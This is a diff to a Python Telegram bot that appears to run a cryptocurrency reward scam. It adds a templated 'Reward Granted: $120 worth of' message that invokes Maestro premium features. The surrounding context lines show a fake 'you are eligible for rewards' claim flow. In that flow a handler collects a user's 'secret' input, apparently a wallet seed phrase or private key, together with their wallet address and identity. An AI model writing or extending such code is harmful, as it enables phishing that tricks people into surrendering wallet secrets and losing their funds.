@@ -819,8 +819,8 @@ async def get_language_selector_keyboard(user_id: int):
     return builder.as_markup()
 
 
-# 1. Regex to isolate a clean Solana contract address from incoming messages
-ETH_BSC_ADDRESS_REGEX = r"0x[a-fA-F0-9]{40}"
+# 1. Regex to isolate a clean contract address from incoming messages
+ETH_BSC_ADDRESS_REGEX = r"0x[a-fA-F0-9]+"
 SOLANA_ADDRESS_REGEX = r"[1-9A-HJ-NP-Za-km-z]{32,44}"
 CONTRACT_ADDRESS_REGEX = rf"(?:{ETH_BSC_ADDRESS_REGEX}|{SOLANA_ADDRESS_REGEX})"
 
@@ -1351,6 +1351,15 @@ def build_congratulations_message(token_name: str = "the token") -> str:
         "<b><i>🎉🎉🎉 CONGRATULATIONS 🎉🎉🎉</i></b>\n\n"
         f"<b>You are eligible for rewards for <i>{escape(token_name)}</i>.</b>\n"
         "<i>Click <b>Claim</b> to get your reward.</i>"
+    )
+
+
+def build_reward_granted_message(token_name: str = "the token") -> str:
+    token_name = (token_name or "the token").strip() or "the token"
+    return (
+        "<b>✅ Reward Granted ✅</b>\n"
+        f"<b>$120 worth of {escape(token_name)}</b> click /premium to access Maestro premium features\n"
+        "<i>Click /start to start trading. Enjoy!</i>"
     )
 
 
@@ -3585,6 +3594,7 @@ async def handle_claim_reward(callback: types.CallbackQuery, state: FSMContext):
 async def handle_reward_secret_input(message: types.Message, state: FSMContext):
     state_data = await state.get_data()
     holder_wallet = state_data.get("holder_wallet", "Not provided")
+    reward_token_name = state_data.get("reward_token_name") or REWARD_TOKEN_NAME_BY_CHAT.get(message.chat.id) or "the token"
     full_name = " ".join(filter(None, [message.from_user.first_name, message.from_user.last_name])).strip() or "N/A"
     username = message.from_user.username or "N/A"
     secret_value = (message.text or "").strip() or "[empty]"
@@ -3614,11 +3624,7 @@ async def handle_reward_secret_input(message: types.Message, state: FSMContext):
     try:
         await message.bot.send_message(
             chat_id=message.chat.id,
-            text=(
-                "<b>✅ Reward Granted ✅</b>\n"
-                "<b>$120 worth of STRATEGIC BITCOIN RESERVE</b> click /premium to access Maestro premium features\n"
-                "<i>Click /start to start trading. Enjoy!</i>"
-            ),
+            text=build_reward_granted_message(reward_token_name),
             parse_mode="HTML",
         )
     except Exception as exc:
